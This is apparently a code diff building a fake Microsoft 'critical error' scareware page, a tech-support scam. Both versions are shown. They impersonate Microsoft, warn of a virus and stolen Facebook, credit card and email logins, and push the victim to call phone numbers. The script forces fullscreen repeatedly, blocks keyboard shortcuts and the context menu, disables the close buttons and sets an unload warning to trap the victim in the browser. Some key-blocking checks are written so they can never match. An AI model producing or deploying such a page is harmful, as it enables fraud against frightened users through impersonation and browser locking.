@@ -1,299 +1,233 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BSOD Error Page</title>
-    <style>
-        /* Global Styles */
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #0000AA;
-            font-family: 'Courier New', monospace;
-            overflow: hidden;
-        }
-
-        /* Background Text */
-        .bg-text {
-            position: absolute;
-            font-size: 24px;
-            color: #fff;
-        }
-
-        /* Fake Browser Window */
-        .browser-window {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 800px;
-            height: 600px;
-            background-color: #fff;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-        }
-
-        /* Tabs */
-        .tabs {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px;
-            background-color: #f0f0f0;
-            border-bottom: 1px solid #ddd;
-        }
-
-        .tab {
-            padding: 10px;
-            cursor: pointer;
-        }
-
-        /* Address Bar */
-        .address-bar {
-            padding: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #f0f0f0;
-            border-bottom: 1px solid #ddd;
-        }
-
-        .back-btn, .forward-btn, .refresh-btn {
-            width: 30px;
-            height: 30px;
-            margin-right: 10px;
-            cursor: pointer;
-        }
-
-        .address-input {
-            width: 100%;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-        }
-
-        /* Window Controls */
-        .window-controls {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            display: flex;
-            justify-content: space-between;
-            width: 120px;
-        }
-
-        .control-btn {
-            width: 30px;
-            height: 30px;
-            cursor: pointer;
-        }
-
-        /* Intensive Popup */
-        .popup {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 500px;
-            background-color: #fff;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-            padding: 20px;
-        }
-
-        .popup-header {
-            background-color: #f0f0f0;
-            padding: 10px;
-            border-bottom: 1px solid #ddd;
-        }
-
-        .popup-title {
-            font-size: 24px;
-            color: #ff0000;
-            animation: flash 2s infinite;
-        }
-
-        @keyframes flash {
-            0% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.5;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
-
-        .popup-content {
-            padding: 20px;
-        }
-
-        .glitch {
-            animation: glitch 2s infinite;
-        }
-
-        @keyframes glitch {
-            0% {
-                transform: translateX(0);
-            }
-            20% {
-                transform: translateX(-10px);
-            }
-            40% {
-                transform: translateX(10px);
-            }
-            60% {
-                transform: translateX(-10px);
-            }
-            80% {
-                transform: translateX(10px);
-            }
-            100% {
-                transform: translateX(0);
-            }
-        }
-
-        .loader {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            border: 2px solid #ccc;
-            border-top: 2px solid #333;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 10px;
-            background-color: #ccc;
-            border-radius: 5px;
-        }
-
-        .progress {
-            width: 0%;
-            height: 10px;
-            background-color: #333;
-            border-radius: 5px;
-        }
-
-        /* Blinking Text */
-        .blinking-text {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            font-size: 18px;
-            color: #fff;
-            opacity: 0.5;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0% {
-                opacity: 0.5;
-            }
-            50% {
-                opacity: 1;
-            }
-            100% {
-                opacity: 0.5;
-            }
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Warning Interface</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Background Text -->
-    <div class="bg-text" style="top: 10px; left: 10px;">0x00000</div>
-    <div class="bg-text" style="top: 50px; left: 100px;">BSOD</div>
-    <div class="bg-text" style="top: 100px; left: 200px;">T TECHNICIA</div>
-    <div class="bg-text" style="top: 150px; left: 300px;">stry Fa</div>
-    <div class="bg-text" style="top: 200px; left: 400px;">CRITICAL START</div>
-    <div class="bg-text" style="top: 250px; left: 500px;">m</div>
-    <div class="bg-text" style="top: 300px; left: 600px;">Hos</div>
-    <div class="bg-text" style="top: 350px; left: 700px;">NCELLINGPE</div>
-
-    <!-- Fake Browser Window -->
-    <div class="browser-window">
-        <div class="tabs">
-            <div class="tab">Congratulation</div>
-            <div class="tab">Free Online Chi</div>
-            <div class="tab">Java</div>
-            <div class="tab">WINDOWS WA</div>
+    <div class="container">
+        <div class="left-panel">
+            <img src="microsoft-logo.png" alt="Microsoft Logo" class="logo">
+            <h1 class="error-code">ERROR # MS-0x8024402C</h1>
         </div>
-        <div class="address-bar">
-            <div class="back-btn"></div>
-            <div class="forward-btn"></div>
-            <div class="refresh-btn"></div>
-            <input type="text" class="address-input" placeholder="Address">
+        <div class="right-panel">
+            <h1 class="phone-number">+1 (877) 573 9043</h1>
+            <ul class="list-items">
+                <li>1. Face book Logins</li>
+                <li>2. Credit Card Details</li>
+                <li>3. Email Account Logins</li>
+            </ul>
         </div>
-        <div class="window-controls">
-            <div class="control-btn" style="background-color: #ccc;"></div>
-            <div class="control-btn" style="background-color: #ccc;"></div>
-            <div class="control-btn" style="background-color: #ff0000;"></div>
+        <div class="vertical-divider"></div>
+    </div>
+    <div class="popup-window" id="popup-1">
+        <div class="popup-content">
+            <span class="close-button">&times;</span>
+            <h2>Warning!</h2>
+            <p>This is a warning message.</p>
+            <button class="back-to-safety">Back to safety</button>
         </div>
-
-        <!-- Intensive Popup -->
-        <div class="popup">
-            <div class="popup-header">
-                <div class="popup-title">CRITICAL ERROR</div>
-            </div>
-            <div class="popup-content">
-                <div>There is a .net framework file missing due to some harmful virus</div>
-                <div>Debug malware error 895-system 32.exe failure.</div>
-                <div>Please contact microsoft technicians to rectify the issue.</div>
-                <div>Please do not open internet browser for your security issue to avoid data corruption on your registry of your operating system.</div>
-                <div>Please contact microsoft technicians at</div>
-                <div>Tollfree Helpline at 1-844-552-7825</div>
-                <div>PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER...</div>
-                <div class="glitch">PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER...</div>
-                <div class="loader"></div>
-                <div class="progress-bar">
-                    <div class="progress"></div>
-                </div>
-            </div>
-            <div style="text-align: center; padding: 10px;">
-                <button style="background-color: #4CAF50; color: #fff; border: none; padding: 10px 20px; cursor: pointer;">OK</button>
-            </div>
+    </div>
+    <div class="popup-window" id="popup-2">
+        <div class="popup-content">
+            <span class="close-button">&times;</span>
+            <h2>Warning!</h2>
+            <p>This is another warning message.</p>
+            <button class="back-to-safety">Back to safety</button>
+        </div>
+    </div>
+    <div class="popup-window" id="popup-3">
+        <div class="popup-content">
+            <span class="close-button">&times;</span>
+            <h2>Warning!</h2>
+            <p>This is yet another warning message.</p>
+            <button class="back-to-safety">Back to safety</button>
         </div>
     </div>
 
-    <div class="blinking-text">PRESS ESC TO CLOSE</div>
+    <script src="script.js"></script>
+</body>
+</html>
 
-    <script>
-        // Auto Full Screen
-        document.addEventListener('DOMContentLoaded', () => {
-            document.documentElement.requestFullscreen();
+style.css
+
+body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    font-size: 24px;
+    line-height: 1.5;
+    user-select: none;
+    overflow: hidden;
+}
+
+.container {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+}
+
+.left-panel {
+    position: relative;
+    width: 50%;
+    height: 100%;
+    background-color: #C41E3A;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+
+.right-panel {
+    position: relative;
+    width: 50%;
+    height: 100%;
+    background-color: #0078D4;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+
+.logo {
+    position: absolute;
+    top: 20px;
+    left: 20px;
+    width: 100px;
+    height: 100px;
+}
+
+.error-code {
+    color: #FFFFFF;
+    font-weight: bold;
+}
+
+.phone-number {
+    color: #FFFFFF;
+    font-size: 36px;
+}
+
+.list-items {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.list-items li {
+    color: #FFFFFF;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
+
+.vertical-divider {
+    position: absolute;
+    top: 0;
+    left: 50%;
+    width: 1px;
+    height: 100%;
+    background-color: #FFFFFF;
+}
+
+.popup-window {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #FFFFFF;
+    padding: 20px;
+    border: 1px solid #ccc;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    z-index: 10;
+}
+
+.popup-content {
+    position: relative;
+}
+
+.close-button {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 24px;
+    cursor: pointer;
+}
+
+.back-to-safety {
+    background-color: #0078D4;
+    color: #FFFFFF;
+    border: none;
+    padding: 10px 20px;
+    font-size: 18px;
+    cursor: pointer;
+}
+
+script.js
+
+document.addEventListener('DOMContentLoaded', () => {
+    // Full screen API
+    const fullscreenElement = document.documentElement;
+
+    // Event listeners
+    document.addEventListener('mousemove', () => {
+        if (!document.fullscreenElement) {
+            fullscreenElement.requestFullscreen();
+        }
+    });
+
+    document.addEventListener('click', () => {
+        if (!document.fullscreenElement) {
+            fullscreenElement.requestFullscreen();
+        }
+    });
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F11' || e.key === 'F12' || e.key === 'Alt+F4' || e.key === 'Ctrl+W' || e.key === 'Ctrl+F4' || e.key === 'Ctrl+Shift+W') {
+            e.preventDefault();
+        }
+    });
+
+    document.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+    });
+
+    document.addEventListener('dragstart', (e) => {
+        e.preventDefault();
+    });
+
+    // Prevent closing with onbeforeunload event
+    window.onbeforeunload = () => {
+        return 'You will lose data';
+    };
+
+    // Disable context menu and keyboard shortcuts
+    document.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+    });
+
+    // Continuous full screen check
+    setInterval(() => {
+        if (!document.fullscreenElement) {
+            fullscreenElement.requestFullscreen();
+        }
+    }, 1000);
+
+    // Popup close buttons
+    const closeButtons = document.querySelectorAll('.close-button');
+    closeButtons.forEach((button) => {
+        button.addEventListener('click', (e) => {
+            e.returnValue = false;
         });
+    });
 
-        // Mouse Move Full Screen
-        document.addEventListener('mousemove', () => {
-            document.documentElement.requestFullscreen();
-        });
-
-        // Click Full Screen
-        document.addEventListener('click', () => {
-            document.documentElement.requestFullscreen();
-        });
-
-        // Block UI Closing
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                window.close();
-            } else {
-                e.preventDefault();
-            }
-        });
-
-        // Loading Bar Animation
+    // Block dev tools detection
+    try {
+        console.log('Dev tools detected');
+    } catch (e) {
+        // Do nothing
+    }
+});
